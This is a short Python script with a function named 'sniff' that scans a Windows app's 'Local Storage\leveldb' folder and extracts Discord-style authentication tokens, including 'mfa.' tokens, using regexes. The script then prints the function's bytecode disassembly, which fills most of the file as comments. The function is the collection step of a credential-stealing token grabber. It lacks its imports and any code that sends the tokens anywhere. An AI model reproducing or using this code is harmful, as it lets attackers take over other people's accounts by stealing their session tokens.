import dis

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
print(dis.dis(sniff))
# 4           0 LOAD_FAST                0 (path)
#               2 LOAD_CONST               1 ('\\Local Storage\\leveldb')
#               4 INPLACE_ADD
#               6 STORE_FAST               0 (path)

#   6           8 BUILD_LIST               0
#              10 STORE_FAST               1 (tokens)

#   8          12 SETUP_LOOP             132 (to 146)
#              14 LOAD_GLOBAL              0 (os)
#              16 LOAD_METHOD              1 (listdir)
#              18 LOAD_FAST                0 (path)
#              20 CALL_METHOD              1
#              22 GET_ITER
#         >>   24 FOR_ITER               118 (to 144)
#              26 STORE_FAST               2 (file_name)

#   9          28 LOAD_FAST                2 (file_name)
#              30 LOAD_METHOD              2 (endswith)
#              32 LOAD_CONST               2 ('.log')
#              34 CALL_METHOD              1
#              36 POP_JUMP_IF_TRUE        50
#              38 LOAD_FAST                2 (file_name)
#              40 LOAD_METHOD              2 (endswith)
#              42 LOAD_CONST               3 ('.ldb')
#              44 CALL_METHOD              1
#              46 POP_JUMP_IF_TRUE        50

#  10          48 JUMP_ABSOLUTE           24

#  12     >>   50 SETUP_LOOP              90 (to 142)
#              52 LOAD_CONST               4 (<code object <listcomp> at 0x00000224B7CA3780, file "c:\Users\User\Desktop\test-field\test-real.py", line 12>)
#              54 LOAD_CONST               5 ('sniff.<locals>.<listcomp>')
#              56 MAKE_FUNCTION            0
#              58 LOAD_GLOBAL              3 (open)
#              60 LOAD_FAST                0 (path)
#              62 FORMAT_VALUE             0
#              64 LOAD_CONST               6 ('\\')
#              66 LOAD_FAST                2 (file_name)
#              68 FORMAT_VALUE             0
#              70 BUILD_STRING             3
#              72 LOAD_CONST               7 ('ignore')
#              74 LOAD_CONST               8 (('errors',))
#              76 CALL_FUNCTION_KW         2
#              78 LOAD_METHOD              4 (readlines)
#              80 CALL_METHOD              0
#              82 GET_ITER
#              84 CALL_FUNCTION            1
#              86 GET_ITER
#         >>   88 FOR_ITER                50 (to 140)
#              90 STORE_FAST               3 (line)

#  13          92 SETUP_LOOP              44 (to 138)
#              94 LOAD_CONST               9 (('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'))
#              96 GET_ITER
#         >>   98 FOR_ITER                36 (to 136)
#             100 STORE_FAST               4 (regex)

#  14         102 SETUP_LOOP              30 (to 134)
#             104 LOAD_GLOBAL              5 (re)
#             106 LOAD_METHOD              6 (findall)
#             108 LOAD_FAST                4 (regex)
#             110 LOAD_FAST                3 (line)
#             112 CALL_METHOD              2
#             114 GET_ITER
#         >>  116 FOR_ITER                14 (to 132)
#             118 STORE_FAST               5 (token)

#  15         120 LOAD_FAST                1 (tokens)
#             122 LOAD_METHOD              7 (append)
#             124 LOAD_FAST                5 (token)
#             126 CALL_METHOD              1
#             128 POP_TOP
#             130 JUMP_ABSOLUTE          116
#         >>  132 POP_BLOCK
#         >>  134 JUMP_ABSOLUTE           98
#         >>  136 POP_BLOCK
#         >>  138 JUMP_ABSOLUTE           88
#         >>  140 POP_BLOCK
#         >>  142 JUMP_ABSOLUTE           24
#         >>  144 POP_BLOCK

#  16     >>  146 LOAD_FAST                1 (tokens)
#             148 RETURN_VALUE

# Disassembly of <code object <listcomp> at 0x00000224B7CA3780, file "c:\Users\User\Desktop\test-field\test-real.py", line 12>:
#  12           0 BUILD_LIST               0
#               2 LOAD_FAST                0 (.0)
#         >>    4 FOR_ITER                20 (to 26)
#               6 STORE_FAST               1 (x)
#               8 LOAD_FAST                1 (x)
#              10 LOAD_METHOD              0 (strip)
#              12 CALL_METHOD              0
#              14 POP_JUMP_IF_FALSE        4
#              16 LOAD_FAST                1 (x)
#              18 LOAD_METHOD              0 (strip)
#              20 CALL_METHOD              0
#              22 LIST_APPEND              2
#              24 JUMP_ABSOLUTE            4
#         >>   26 RETURN_VALUE